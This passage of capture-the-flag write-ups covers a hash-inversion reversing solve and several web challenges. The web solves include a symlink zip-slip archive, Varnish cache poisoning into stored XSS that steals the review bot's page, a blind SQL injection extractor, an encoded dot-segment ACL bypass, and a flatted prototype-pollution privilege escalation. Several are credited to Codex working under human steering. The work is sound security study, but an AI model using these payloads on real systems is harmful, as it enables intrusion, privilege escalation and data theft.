The CAU never stores the key; it stores a 64-bit hash of each 8-byte block and compares against that. The
hash — an `fmix64`-style finalizer — is built entirely from invertible operations: an xorshift by at
least half the word width undoes itself, and multiplying by an odd constant is a bijection mod 2^64. The
mix is therefore a permutation of 64-bit values, so each target has exactly one preimage and it can be
computed directly. The only real work is reading the interleaved assembly carefully enough to pair each
block with its constant; a decompiler mis-renders it.

**Validation / reproduction**

The script pushes the three recovered blocks forward through the binary's own mix and asserts they equal
the three stored constants, and the key is exactly 24 printable bytes — both strong signals that the
answer is right without ever executing the untrusted binary. The flag was accepted on the first
submission.

Reproduction summary: confirm the SHA-256, locate `main` via `_start`'s `mov $0x4014f0,%rdi`, read the
`strlen == 24` gate and the per-block `fmix64`, follow `%rdx`/`%rax` to pair each block with its target
constant, then invert (xorshift self-inverse, odd-multiplier modular inverse) and pack little-endian.
Gotcha: trust the disassembly over the decompiler here — the interleaved block 0 is where decompilers
drop steps.


## Web

### Apogee

> Web · Hard · Mohamed Amine Mzoughi  
> Points: 540 · Flag submitted by: secretNinja

**The flag**

`CSCTF{pEnICMJKwUXLNvO8GJObv8Pu}` — a 24-character per-team random value carried in the pass receipt,
released only after the sealed receipt is unlocked with the matching digest (see step 6).

**Tools used**

Codex, run under human steering, developed this end-to-end solve (the zip extraction differential, the
multipart submission, and the sealed-receipt unlock) and handed the flag back; the team verified it and
submitted once through the guarded path (byline: secretNinja). Codex never submits.

**Challenge**

Apogee is a black-box satellite ground-segment portal with no handout files. Everything needed to
reconstruct the attack is published by the portal itself: `GET /api/v1/schema`, `/journal`,
`/deliveries`, `/reference/validated`, `/reference/vendors`, `/reference/clock` and
`GET /api/v1/pass/receipt`. The operational goal is to restore ORRIN-3's validated manoeuvre table
into the write-protected trusted store so the next uplink pass is authorized; the receipt releases a
pass code only once the trusted table matches the validated original *and* the journal shows that the
restoration arrived through the delivery pipeline.

Two things make this hard. Vendor delivery needs an accreditation we do not hold, and the trusted
table store "is not writable through any published route; the delivery pipeline is the only writer"
(schema). The only route a non-vendor can reach is the analyst re-submission endpoint
`POST /api/v1/submissions`, which validates and extracts a package inside a staging root. So the win
has to come from the pipeline's own handling of an archive, not from writing the file directly.

**Approach / walkthrough**

1. **Read the pipeline contract.** The schema describes verifier and extractor as two separate
   stages. The verifier: "resolves each member path to one archive entry through a name lookup, then
   compares size and SHA-256. The manifest is the declaration; the verifier reads nothing else." Its
   `member_rules` spell out `lookup: by-name`, "the name-to-entry mapping resolves to one entry", and
   that each member's resolved entry must match the manifest size and SHA-256. The extractor is
   `extract-zip 2.0.1`, and its note is the key: "symbolic links and unix modes declared in the
   archive are honoured." The schema even documents how a symlink is encoded in a ZIP — unix mode bits
   `S_IFLNK|0777` in the external-attributes field (`0xA1FF0000`, APPNOTE.TXT 4.4.2), with the link
   member's content being the target string, hashed like any other member.

2. **Find the trick in the journal.** `GET /journal` lists every validation/extraction record. The
   accepted Vantrik Systems package for ORRIN-3 (`PKG-3210`, table `orrin3.ctab`) is the tell:

   ```json
   "validation": {"entries_validated": 6, "archive_entries": 7, "status": "passed"},
   "extraction": {"entries_extracted": 7,
     "entry_names": ["docs/README.txt","docs/release-notes.txt","checksums.sha256",
                     "meta/vendor.json","docs/install.txt","tables/orrin3.ctab","tables/orrin3.ctab"],
     "links": {"tables/orrin3.ctab": {"target": "../../../trusted/mvr/orrin3.ctab",
       "resolved": "/tmp/apogee/trusted/mvr/orrin3.ctab",
       "sha256": "2b18f1199b3e63a146569f1195355d753ccaafa90186274bf1bc69a5a5588dc7"}}}
   ```

   `archive_entries: 7` but `entries_validated: 6`, and `tables/orrin3.ctab` appears **twice** in
   `entry_names`. The `links` block shows the first of those two entries was a symlink whose target,
   `../../../trusted/mvr/orrin3.ctab`, resolved straight into the write-protected trusted store. So the
   hostile vendor package carried two entries sharing one name: a symlink into `trusted/`, then a
   regular file. The verifier's by-name lookup collapses the duplicate to a single entry (the regular
   file that matches the manifest), so only six members are hashed; the extractor iterates over all
   seven in order, creates the symlink, and then writes the second same-named entry *through* that
   symlink into `trusted/mvr/`.

3. **Pin the target bytes.** `GET /reference/validated` returns the 842-byte validated ORRIN-3
   manoeuvre table (revision 40). `GET /api/v1/pass/receipt` gives the target and the blockers:

   ```json
   {"expected_sha256": "6589d039b787c6ea4ca18e7df679cf6bf624b4725415fe51610a7315229e8dac",
    "trusted_path": "/tmp/apogee/trusted/mvr/orrin3.ctab",
    "trusted_sha256": "2b18f1199b3e63a146569f1195355d753ccaafa90186274bf1bc69a5a5588dc7",
    "trusted_size": 896, "status": "pending",
    "reasons": ["trusted_table_hash_mismatch", "no_pipeline_restoration_record"]}
   ```

   The trusted table currently holds the poisoned 896-byte revision (hash `2b18f119…`, matching the
   journal's Vantrik write). We need it to become the validated 842-byte table whose SHA-256 is
   `6589d039…` (also the manifest's `expected_sha256`).

4. **Rebuild the same package for the analyst route.** The analyst re-submission uses the same verifier
   and extractor, so it inherits the write-through-symlink primitive. Using a small offline ZIP builder
   that writes duplicate entry names and symlink mode bits verbatim (`exploit/pkg.py`), the package
   `exploit/restore.zip` was built with two entries, both named `tables/orrin3.ctab`:

   - entry 1 — symlink, external attr `0o120777` (`S_IFLNK|0777`), 32-byte content
     `../../../trusted/mvr/orrin3.ctab`;
   - entry 2 — regular file, external attr `0o100644`, the 842-byte validated table.

   The manifest (`exploit/manifest.json`) declares exactly one member:

   ```json
   {"path": "tables/orrin3.ctab", "size": 842,
    "sha256": "6589d039b787c6ea4ca18e7df679cf6bf624b4725415fe51610a7315229e8dac", "type": "file"}
   ```

   The verifier's by-name lookup resolves `tables/orrin3.ctab` to the regular-file entry, hashes its
   842 bytes, and gets `6589d039…`, matching the manifest — validation passes. The extractor then
   processes both entries in order: it creates the symlink into `trusted/mvr/`, then writes the 842
   bytes through it, overwriting the trusted table with the validated original.

5. **Submit the crafted package.** `POST /api/v1/submissions` as multipart form with fields `manifest`
   and `package` (the endpoint returns `405 E_METHOD` "POST a multipart form with fields manifest and
   package" on anything else; it is rate-limited at 30). The package is accepted: the trusted table now
   hashes to `expected_sha256`, and the extraction is journalled as a pipeline restoration record,
   clearing both blocking reasons.

6. **Unlock the sealed receipt.** `GET /api/v1/pass/receipt` does **not** hand over the pass code on its
   own — the receipt is sealed. The server returns `422 flag.locked` with `unlock_algorithm:
   "sha256-hex"` and an `unlock_input` template, and withholds the code until the request carries the
   matching digest. The unlock value is `sha256("apogee|ORRIN-3|<validated_sha256>|<package_id>")` with
   the fields taken from this instance: spacecraft `ORRIN-3`, `validated_sha256` =
   `6589d039b787c6ea4ca18e7df679cf6bf624b4725415fe51610a7315229e8dac`, and `package_id` =
   `RESTORE-6589D039`. So the unlock input string is
   `apogee|ORRIN-3|6589d039b787c6ea4ca18e7df679cf6bf624b4725415fe51610a7315229e8dac|RESTORE-6589D039`.
   Requesting `GET /api/v1/pass/receipt?unlock=<that sha256-hex>` returns HTTP 200, and the receipt's
   pass code **is** the flag, `CSCTF{pEnICMJKwUXLNvO8GJObv8Pu}`.

**Why it works**

Verification and extraction disagree on what the archive contains. The verifier maps a name to a single
entry, so a duplicate entry name hides the first entry (the symlink) from hashing — only the benign
regular file is validated. The extractor iterates over every entry and honours the unix symlink mode it
has just created, so the "validated" regular file is written outside the staging root, into the trusted
store. Because the analyst re-submission route runs the same verifier and extractor as vendor delivery,
it inherits the identical primitive, and the resulting write is logged in the journal as the required
pipeline restoration record. It is a parser-differential plus a zip-slip-via-symlink, both facilitated
by `extract-zip 2.0.1` honouring declared symlinks and modes.

**Validation / reproduction**

Before submitting, the manifest SHA-256 was checked against the receipt's `expected_sha256`
(`6589d039…`), confirming the package carried the exact validated bytes the gate wants. After the
submission the receipt was still sealed (`422 flag.locked`); supplying the `sha256-hex` unlock digest
over `apogee|ORRIN-3|<validated_sha256>|RESTORE-6589D039` released the pass code
`CSCTF{pEnICMJKwUXLNvO8GJObv8Pu}`, which was accepted.

Reproduction summary: pull `/api/v1/schema`, `/journal`, `/reference/validated` and
`/api/v1/pass/receipt`; read the Vantrik journal entry to recover the duplicate-name + symlink trick
and the target path; fetch the 842-byte validated table; build a ZIP with a symlink entry
(`../../../trusted/mvr/orrin3.ctab`) followed by a same-named regular-file entry holding the validated
table; declare one member in the manifest with size 842 and SHA-256 `6589d039…`; POST both as multipart
to `/api/v1/submissions`; then unlock the sealed receipt with
`GET /api/v1/pass/receipt?unlock=sha256("apogee|ORRIN-3|<validated_sha256>|RESTORE-6589D039")` to read
the pass code. Gotchas: the symlink must come **first** in the archive so it exists before the regular
file is extracted through it, and both entries must share the exact name the manifest declares; and the
receipt stays sealed (`422 flag.locked`, `unlock_algorithm: sha256-hex`) until the correct `unlock`
digest is supplied.

### Broadsheet Organizer

> Web · Not shown · Paul Valase  
> Points: 851 · Flag submitted by: secretNinja

**The flag**

`CSCTF{GiDFAaqWrGMx6bo1FRL4TgJV}`

The challenge ran on a per-team instance that is no longer up; `<instance>` below stands for the address the challenge page gave you.

**Challenge**

"The floor's pages are served through a shared cache, so everyone on shift sees the same copy. The duty editor reviews a board when asked." The duty editor is an automated review bot: it opens the board you ask it to, stays a few seconds, and leaves. It has no internet access, issues GET requests only, will not reach anything outside the application, and there is a cap on how many reviews can be in flight at once. The job is to get the flag out of the editor's authenticated context. The chain was found by an OpenAI Codex run following our brief, with paced single-shot probes in Python `requests`.

**Approach / walkthrough**

The board pages sit behind Varnish. The exploit is a cache-key collision: the backend and the cache parse the same URL differently, which lets attacker-controlled bytes be stored under a public, auto-loaded cache key, turning a sandboxed reflection into stored XSS against the review bot.

*1. Map the surfaces.* Three pieces matter:

- **Ticker endpoint** `/z/<zone>/ticker.js` reflects a `text` query parameter, and the query string is **not** part of the Varnish cache key. The value is JSON-encoded and assigned through `textContent`, so it is an unkeyed input but not a script sink — you cannot inject JavaScript through it directly.
- **Raw embed route** `/z/<zone>/embed/<token>` returns caller-supplied `html` bytes as raw content. It is sandboxed (`Cache-Control: no-store`, `nosniff`, `text/html`), but it accepts arbitrary path suffixes such as `/embed/<token>/ticker.js`.
- **Roster** `/roster?dept=editorial&sort=<expr>` concatenates `sort` into a SQLite `ORDER BY`.

*2. The cache-key collision.* The embed handler accepts extra path segments, and the backend routes on the raw path without resolving percent-encoded dot segments. Request:

```text
/z/<source>/embed/<token>/%2e%2e/%2e%2e/ticker.js?html=<javascript>
```

The backend sees the embed route and returns the attacker-controlled `html` bytes. Varnish, hashing the cache key, first **decodes and collapses** the `%2e%2e` segments — normalising the path to `/z/<source>/ticker.js` — and stores the response under the real ticker key, ignoring the backend's `no-store`. So the canonical ticker script for that zone is now attacker bytes. This was confirmed with an inert marker before weaponising it.

*3. Weaponise the poisoned ticker.* The ticker input is length-limited, so rather than exfiltrating the whole `/editor` page, the poisoned script matches just the flag and relays it through the second unkeyed channel. Its logic:

- `fetch('/editor')` with the bot's session (same-origin, GET, no internet needed);
- match `CSCTF\{[^}]+\}` in the response;
- request a **second** zone's ticker with the match as its unkeyed `text` value — e.g. `/z/<sink>/ticker.js?text=<flag>` — which primes that zone's ticker cache with the flag.

*4. Fire the chain.* Poison the source zone's ticker with the script above, then ask the duty editor to review the source board (the one review action the bot offers). The bot loads `/z/<source>/ticker.js`, gets the poisoned script from the cache, runs it in its authenticated session, reads `/editor`, and pushes the matched flag into the sink zone's ticker. Finally, read the sink zone's canonical `ticker.js` once:

```text
GET /z/<sink>/ticker.js
```

The Varnish cache hit contains the exact flag the bot wrote from its authenticated `/editor` response:

```text
CSCTF{GiDFAaqWrGMx6bo1FRL4TgJV}
```

*The roster SQLi (a dead end worth recording).* The `sort` parameter of `/roster?dept=editorial` is a genuine SQLite `ORDER BY` injection, confirmed with a blind oracle (`blind_sqli.py`). That extractor encodes one nibble per request in the permutation of the four editorial rows (ids 25–28): for a target byte it builds `CASE id WHEN … END` coefficients `a`, `b` and sorts by `((a*nibble + b) % 97)`, then reverses the observed row order (parsed from `<tr><td>(\d+)</td>`) back to the nibble via a precomputed `PERM_TO_NIBBLE` table — two requests (high and low nibble) recover each character, paced at 0.15 s. It works, but `sqlite_temp_master` was empty, there were no views/triggers, and credential-keyword searches across every known column returned zero rows: the editor cookie and the flag live outside SQL-visible storage, so this route is a dead end. A marker-only CL.TE desync (`smuggle_probe.py`) was also tried and rejected by Varnish with `400 Bad Request`. The cache-key collision is the intended path.

**Why it works**

The backend and the cache parse the same URL differently. The backend routes on the raw path and serves attacker bytes from the embed handler; Varnish decodes and collapses `%2e%2e` before hashing, so those bytes are stored under the public `/z/<source>/ticker.js` key — and Varnish caches them despite the backend's `no-store`, because the normalised request looks like an ordinary cacheable asset. Every visitor's board then loads that script, including the authenticated review bot, which turns a sandboxed `html` reflection into stored XSS in the editor's session. The ticker's second, unkeyed `text` parameter supplies an exfiltration channel that needs no internet egress: the bot writes the flag into one zone's unkeyed cache entry, and the attacker reads it back from the other end as a cache hit. Two different unkeyed inputs — one for delivery via the dot-segment collision, one for exfiltration via the query string — chain into a full read of the bot's authenticated content.

**Validation / reproduction**

The flag was read directly from a Varnish cache hit whose content the bot had written from its authenticated `/editor` response — recovered, not guessed — and it carried the `CSCTF{...}` frame; it was accepted on the first guarded submission. The collision step was validated against an inert marker before the live payload, proving the encoded dot-segment request lands on the real ticker key. To reproduce: confirm `/z/<zone>/ticker.js?text=` is unkeyed and `/z/<zone>/embed/<token>` serves raw `html` with path suffixes; poison `/z/<source>/embed/<token>/%2e%2e/%2e%2e/ticker.js?html=<script>` so Varnish stores it as `/z/<source>/ticker.js`; have the script `fetch('/editor')`, match `CSCTF\{[^}]+\}`, and relay the match into `/z/<sink>/ticker.js?text=`; trigger a review of the source board and read `/z/<sink>/ticker.js`. Gotchas: keep the dot segments percent-encoded so the backend does not resolve them but Varnish does; respect the review-in-flight cap and keep probes paced and single-shot; and the ticker length limit means you must relay only the regex match, not the whole `/editor` page.

### Corridor Transit Gate

> Web · Medium · Chronos Security  
> Points: 299 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{dIzjuUVx6ANPNKhInHTsfNlI}`

Each team's instance minted its own random token, so the value above is the one this instance returned; the `CSCTF{...}` in the brief is only the format template, never a lead. The real token only ever exists inside a live instance's responses. The challenge ran as a per-team container, now down; every request below is shown exactly as it was sent, with the host written as `<instance>`.

**Challenge**

An automated freight checkpoint at the Northern Viaduct has locked an emergency barrier on convoy `CTLD-FR-8821` over an axle-weight discrepancy. As the duty transit analyst you have to investigate the clearance pipeline, resolve the hold, and authorize the emergency viaduct clearance. The only handout is `api_specification.json` (6459 bytes, SHA-256 `50874d28a16cb41aee2495975fb70b40db99f374eab62f4069ad3945ab4b3b92`), an OpenAPI description of the public CTLD freight API.

**Approach / walkthrough**

*Tools:* `curl` for walking the API, and a short standard-library Python raw-socket script so the escaped request path reaches the gateway unmodified. `curl --path-as-is` does the same job.

*1. Read the spec.* `api_specification.json` is the whole public surface, and there is no auth scheme anywhere in it — everything is open:

- `GET /api/v1/corridor/status` — corridor state, advisories, max load ratings
- `POST /api/v1/corridor/assess` — `{corridor, gross_weight_kg, axles}` compliance calc
- `GET` / `POST /api/v1/consignments` and `GET /api/v1/consignments/{id}` — list / register / full docket
- `GET /api/v1/telemetry/station/{station_id}` — live weighbridge readings
- `POST /api/v1/clearance/request` — `{consignment_id}` standard clearance

*2. Walk the public routes.* `GET /api/v1/corridor/status` shows `CORRIDOR_VIADUCT_NORTH` as `RESTRICTED`, `max_gross_weight_kg: 40000`, one active hold ("Automated scale interlock active at Station CP-04"). `GET /api/v1/consignments` lists `CTLD-FR-8821`, status `HELD_AXLE_WEIGHT_DISCREPANCY`, current checkpoint `CP-04`. Its docket (`GET /api/v1/consignments/CTLD-FR-8821`) gives the `hold_reason`: "Automated WIM scale CP-04 recorded 46,200 kg against declared 22,000 kg. Viaduct structural limit is 40,000 kg," with an audit log showing `GATE_BARRIER_LOCKED`. `GET /api/v1/telemetry/station/CP-04` corroborates the `measured_weight_kg: 46200`.

*3. Ask for clearance the public way.* The one public release route rejects it, because 46,200 kg really is over the limit:

```sh
curl -s -X POST http://<instance>/api/v1/clearance/request \
  -H 'Content-Type: application/json' -d '{"consignment_id":"CTLD-FR-8821"}'
```

```json
{"error":"Corridor Capacity Exceeded","code":"ERR_AXLE_WEIGHT_DISCREPANCY",
 "status":"REJECTED_HELD_UNDER_TE160",
 "advisory":"Standard haulier clearance prohibited for overweight abnormal loads. Clearance must be authorized via internal dispatch controller."}
```

The advisory names the exit: an **internal dispatch controller**, a route not in the spec.

*4. Find the emergency route in the front end.* The site's own API docs page (`/developers`) states that "Administrative dispatch and emergency override endpoints are restricted to internal enforcement infrastructure" — so the route exists and the gateway is what keeps you out. The convoy's portal page (`/portal/consignment/CTLD-FR-8821`) loads a chunk named `chunk-dispatch-admin.9c4d.js`. Fetch it:

```sh
curl -s http://<instance>/static/assets/js/chunks/chunk-dispatch-admin.9c4d.js
```

It defines the route and the handler that prints the token:

```js
routes:{ ... internalDispatch:"/internal/dispatch/emergency-clearance" }
submitSupervisorClearance:async function(t,r){
  const o=await fetch(this.client.apiPrefix+this.client.routes.internalDispatch,{
    method:"POST",
    headers:{"Content-Type":"application/json","X-Requested-With":"XMLHttpRequest"},
    body:JSON.stringify({consignment_id:t,reason:r||"Operational emergency corridor escort"})
  });
  return{status:o.status,ok:o.ok,data:await o.json()};
}
```

So the target is `POST /api/v1/internal/dispatch/emergency-clearance` with `{consignment_id, reason}` (reason optional), and its success handler renders `e.data.clearance_token` — flag-shaped.

*5. Knock on the internal door.* Any `/api/v1/internal/*` route is answered by the edge gateway before the backend sees it:

```sh
curl -s -i http://<instance>/api/v1/internal/dispatch
```

```
HTTP/1.1 403 Forbidden
Server: CTLD-Gateway/3.2.0 (Go-ReverseProxy)
X-Gateway-Node: gateway-edge-01

{"error":"Forbidden","code":"GW_ACL_INTERNAL_ROUTE_PROHIBITED","message":"Access to internal dispatch infrastructure (/api/v1/internal/*) is restricted to authorized intranet nodes.","gateway_node":"gateway-edge-01"}
```

The gateway itself answered — note `X-Gateway-Node`, a single `Server:` header, and no `X-Engine-Node` (responses that reach the backend come back with `X-Engine-Node: dispatch-core-01` and a doubled `Server:` line). The emergency route and every method on it return the same 403. "Authorized intranet nodes" hints at headers, but `X-Forwarded-For: 127.0.0.1`, `X-Real-IP`, a doctored `Host: dispatch-core-01` and the rest change nothing. The ACL reads the path, not headers.

*6. Slip the path past the ACL.* Probing with raw request paths shows exactly how the ACL reads the path:

| Raw path sent | Gateway says |
|---|---|
| `/api/v1/internal/dispatch/emergency-clearance` | `403 GW_ACL_INTERNAL_ROUTE_PROHIBITED` |
| `/api/v1/%69nternal/dispatch/emergency-clearance` | `403` — percent-decoding happens **before** the prefix check |
| `/api/v1/./internal/dispatch/emergency-clearance` | `301` to the canonical path |
| `/api/v1/internal%2fdispatch%2femergency-clearance` | `404 page not found` |
| `/api/v1/corridor/status/..%2finternal/dispatch/emergency-clearance` | backend `404` echoing `"path":"/api/v1/corridor/internal/dispatch/emergency-clearance"` |

That last row is the bug. The gateway routes `/api/v1/corridor/...` to the backend (a public subtree) and the ACL sees only the decoded, *uncleaned* path — which still begins `/api/v1/corridor`, so it waves the request through. The dot segments are cleaned only on the next hop, where `status/..%2finternal` collapses toward the internal handler. The recipe: stay inside a public subtree the mux will route, and climb out of it with enough escaped dot segments to land on the internal route after cleaning. `/api/v1/corridor/status/X` needs two `..` — one to cancel `status`, one to cancel `corridor` — and both must stay percent-escaped, because a literal `../` makes the Go mux answer a `301` to the cleaned path, putting you back in front of the ACL.

```
raw:     /api/v1/corridor/status/%2e%2e/%2e%2e/internal/dispatch/emergency-clearance
decoded: /api/v1/corridor/status/../../internal/dispatch/emergency-clearance  (ACL: no /api/v1/internal prefix -> pass)
cleaned: /api/v1/internal/dispatch/emergency-clearance                        (behind the ACL)
```

Escaped paths are where HTTP clients start silently rewriting, so send the request over a plain socket. The solve script (`attack_emergency_clearance.py`) opens a `socket.create_connection`, writes the request line verbatim with `Connection: close`, and fires a GET then a POST at the hidden path. The GET confirms reachability; the POST carries the body:

```sh
curl -s --path-as-is -X POST \
  'http://<instance>/api/v1/corridor/status/%2e%2e/%2e%2e/internal/dispatch/emergency-clearance' \
  -H 'Content-Type: application/json' -d '{"consignment_id":"CTLD-FR-8821"}'
```

```json
{"status":"APPROVED","clearance_id":"CTLD-EMERG-2026-1794058335","consignment_id":"CTLD-FR-8821",
 "authorized_corridor":"CORRIDOR_VIADUCT_NORTH","gate_barrier_state":"OPEN",
 "clearance_token":"CSCTF{dIzjuUVx6ANPNKhInHTsfNlI}",
 "message":"Emergency transit clearance approved. Viaduct barrier unlocked."}
```

The `..%2f..%2f` spelling works identically. The `clearance_token` is the flag.

**Why it works**

The gateway authorizes and routes on two different views of the same request target. Its ACL percent-decodes the raw path and blocks anything whose decoded form starts with `/api/v1/internal`, but it never cleans dot segments — and the Go mux routes `/api/v1/corridor/status/...` into the public corridor subtree, while the actual unquoting and dot-segment collapsing happen one hop later at the backend. Escaped dot segments (`%2e%2e`, `..%2f`) are not literal `../`, so they never trip the mux's 301-to-canonical rewrite, and the decoded path still starts with `/api/v1/corridor`, so the ACL sees a public route and steps aside. Only afterwards does `status/../..` collapse back to `/api/v1`, dropping the request onto the internal emergency-clearance handler the ACL was meant to guard.

**Validation / reproduction**

A GET on the same escaped path returned a backend `404` echoing the *cleaned* path `/api/v1/internal/dispatch/emergency-clearance` and no longer carried `GW_ACL_INTERNAL_ROUTE_PROHIBITED` — proof the internal subtree was reached cleanly before any POST was sent. The POST then returned an `APPROVED` record with `gate_barrier_state: OPEN` and the `CSCTF{...}` token, accepted on the first submission. Reproduce by walking the public routes to the held convoy, pulling `chunk-dispatch-admin.9c4d.js` for the internal route, confirming the 403 wall, then sending the two-`..%2e%2e` POST over a raw socket (or `curl --path-as-is`). Gotcha: keep the dot segments percent-escaped end to end — any client that normalizes the path, or a literal `../`, triggers the mux's 301 and bounces you back to the ACL.

### Cutover

> Web · Hard · Mohamed Amine Mzoughi  
> Points: 540 · Flag submitted by: secretNinja

**The flag**

```
CSCTF{IvQeWOjdhtePkb9BO19KuFrf}
```

Recovered from the genuine Cutover recall receipt (HTTP 200) on the assigned live instance, then submitted through the guarded path and accepted on the first submission.

**Challenge**

Marenth's real-time settlement rail closes its value day at 16:00. Eleven batches are queued for the cutover window and one was planted by the "Glass Tide" actor; if it settles as queued it drains the sovereign liquidity buffer below its floor and the rail must be suspended. The duty console runs at **OPERATOR** tier, but recalling a queued batch requires **SUPERVISOR**. The task is to find the hostile batch and get a recall accepted while the cutover window is still open — the recall receipt carries the authorization code (the flag). The settlement engine ships as `engine-src.tar.gz` (also served at `/source/engine-src.tar.gz`) and matches the build the rail runs; the API, manifest wire format, and error taxonomy are published at `/api/v1/schema`. The relevant files in the bundle are `src/server.js` (HTTP surface, sessions, instruction execution, receipts), `src/tiers.js` (tier/grant resolution), `src/intake.js` (manifest intake), and `vendor/flatted/` pinned at **3.4.1**.

**Tools used**

Codex (run under human guidance), which developed and ran the exploit against the live instance and submitted the accepted flag. It used Node to check the vendored `flatted` resolver and `JSON.parse` behavior offline, and a small Python requests script (`exploit.py`).

**Approach / walkthrough**

The engine source was audited offline first; the live console was used only for the final run. Three primitives chain together: a prototype-pollution bug grants the OPERATOR session a SUPERVISOR-only action, a reconciliation check identifies the planted batch, and a JSON-number parsing differential gets the recall value past the risk gateway.

*1. The pollutable grant check (`src/tiers.js`).* Tier grants are built as a JS **Array** used as a map, and the action check reads a named property off that array:

```js
function container(actions) {
  const grants = [];
  for (const action of actions) grants[action] = true;   // grants["RECALL"] = true
  return grants;
}
function permitted(table, session, action) {
  return grantsFor(table, session)[action] === true;      // grants["RECALL"] === true
}
```

Because `grants` is an `Array`, `grants["RECALL"]` falls through to `Array.prototype.RECALL` when the own property is absent. If `Array.prototype.RECALL` is set to `true` globally, every session — including the default OPERATOR — passes the SUPERVISOR gate. Sessions auto-create at OPERATOR tier for any `x-session` id of 8–64 characters (`sessionFor` in `server.js`), so there is no login to defeat, only the grant check.

*2. Prototype pollution via `flatted` 3.4.1 (`src/intake.js` + `vendor/flatted`).* The manifest is parsed with the pinned flatted, then `normalise()` runs `merge(basis, manifest.hints)`:

```js
function normalise(manifest) {
  const basis = manifest.basis ?? {};
  merge(basis, ROUTING_DEFAULTS);
  merge(basis, manifest.hints ?? {});   // copies hints keys onto `basis`
  manifest.basis = basis;
  return manifest;
}
```

flatted encodes a value as a top-level array of records and represents every reference as a `String` wrapper used to index back into that array (`input[value]`). A reference whose literal text is `"__proto__"` makes `input["__proto__"]` resolve to **`Array.prototype`**, which is an object and so passes the resolver's `typeof tmp === "object"` check. flatted hands back `Array.prototype` as a legitimately resolved field value. A manifest whose `basis` is a `"__proto__"` reference and whose `hints` resolves to `{ "RECALL": true }` therefore runs `merge(Array.prototype, {RECALL:true})`, executing `Array.prototype.RECALL = true`. The wire body (record 0 is the manifest, record 1 is the hints object, `"1"` references record 1):

```
[{"basis":"__proto__","hints":"1"},{"RECALL":true}]
```

Crucially, `normalise()` runs **before** `validate()`, so the pollution lands even though the manifest then fails validation and the POST returns `400 manifest.invalid`. That rejection is expected; the global `Array.prototype.RECALL` grant persists for the life of the process.

*3. Session and routing.* The engine routes sit under an API prefix the script reads from `/api/v1/schema` (the `.../manifests` route), falling back to `/api/v1`. We sent an `x-session` header with an 8–64-character id to establish the OPERATOR session, then POSTed the manifest above to `<prefix>/manifests`.

*4. Identifying the hostile batch (reasoned, not swept).* `handleInstruction` refuses a recall unless the batch id equals `state.hostile` **and** the value equals the batch's settled aggregate, returning the same `422 recall.not_reconcilable` for either mismatch so the response does not disclose which half failed:

```js
const settled = settledOf(batch);   // sum of instruction.amountMinor
if (batch.id !== state.hostile || instruction.value !== settled) {
  return fail(res, 422, "recall.not_reconcilable", { ... });
}
```

We read `<prefix>/state/buffer` and `<prefix>/state/batches`. The planted batch is the one whose settled aggregate (the integer sum of its instructions' `amountMinor`) takes the liquidity buffer below its floor; a declared-aggregate-vs-settled mismatch is a secondary tell. One batch fit on the live instance: **`MRN-FC18A0`**, settling **35,900,000** minor units. Because the engine returns the same error for a wrong batch or a wrong value, we reasoned to one batch and sent one recall, no sweep.

*5. Risk-gateway number-parsing differential.* The recall is `POST <prefix>/instructions` with body `{"type":"RECALL","batch":"MRN-FC18A0","value":35900000}`. The live risk gateway in front of the engine has a cap below that amount. Sending `value` as the JSON literal `359e5` made the gateway defer screening, while the engine's `JSON.parse` still produced exactly `35900000` — which passes its `typeof value === "number"` / `Number.isFinite(value)` check and the reconciliation. The gateway is not part of the audited bundle; its screening behavior was observed live only. The source shows a screening layer does sit in front (the receipt records `screening: req.headers["x-screening"] || "unscreened"`).

*6. Two-step unlock.* With the grant set and the correct batch+value, the first recall reconciles but the engine returns a locked response (HTTP 422) that discloses the unlock recipe:

```js
// flagUnlock = sha256_hex("cutover|" + batchId + "|" + settled)
return fail(res, 422, "flag.locked", {
  unlock_algorithm: "sha256-hex",
  unlock_input: "cutover|" + batch.id + "|" + settled,
});
```

So `unlock_input = cutover|MRN-FC18A0|35900000` and the algorithm is `sha256-hex`:

```
sha256_hex("cutover|MRN-FC18A0|35900000")
  = 055505291cd791853ca98b0c5b63810bf826c7437dec4fb0a1f5df247a4b7106
```

We resent the same instruction body with `unlock` set to that digest, while the cutover window was still open (the window check runs *after* the unlock check, so once the window closes a correct unlock gets `409 window.closed`). The engine returned HTTP 200 with a receipt whose `flag` field carried the authorization code.

**Why it works**

An `Array` used as a dictionary inherits every property on `Array.prototype`, so a grant check of the form `grants[action] === true` is pollutable and a global prototype write turns into a privilege grant. flatted 3.4.1 indexes its record array with attacker-controlled strings and treats `__proto__` as a valid reference, turning a merge-onto-`basis` into prototype pollution — and because that merge runs before validation, a manifest that gets rejected still pollutes the prototype. Finally, the gateway and the engine read the same JSON number differently: the gateway does not screen the exponent form, and the engine reads it as the exact integer.

**Validation / reproduction**

Offline, a re-implementation of the flatted 3.4.1 parser applied to the wire body gave `manifest.basis === Array.prototype` and `hints = {"RECALL":true}`; after `normalise()`, an empty grants `Array` answered `grants["RECALL"] === true`. The manifest has no `batch` string, so `validate()` rejects it after the pollution, as described. `JSON.parse('359e5') === 35900000` was confirmed in Node, and the unlock digest was recomputed with `printf 'cutover|MRN-FC18A0|35900000' | shasum -a 256` → `055505291cd791853ca98b0c5b63810bf826c7437dec4fb0a1f5df247a4b7106` (matches the log). Live, the engine's own `unlock_input` confirmed the batch and value were right, and the HTTP 200 receipt contained the `CSCTF{...}` flag; Codex submitted it and it was accepted on the first submission.

Reproduction, against `<instance>`: open an OPERATOR session with an 8–64 char `x-session` id; `GET <prefix>/state/buffer` and `<prefix>/state/batches` and reason out the hostile batch (`MRN-FC18A0`, settled `35900000`); `POST <prefix>/manifests` with `[{"basis":"__proto__","hints":"1"},{"RECALL":true}]` (the `400` is expected); `POST <prefix>/instructions {"type":"RECALL","batch":"MRN-FC18A0","value":359e5}` to get the locked response; then resend with `"unlock":"0555...7106"` for the `200` receipt. Gotchas: the API prefix is discovered from `/api/v1/schema`; the pollution persists across the rejected manifest; `value` must be sent as `359e5` to clear the gateway cap; and the unlock must land inside the open cutover window.

### Cyberboy

> Web · Hard · Chronos Security  
> Points: 540 · Flag submitted by: secretNinja

**The flag**

`CSCTF{Mebs9EZklOy3r222MfBkzrTn}`

**Tools used**

None beyond standard CLI utilities and a request-capped Python script, used only to fetch and list the OpenAPI spec.

**Challenge**

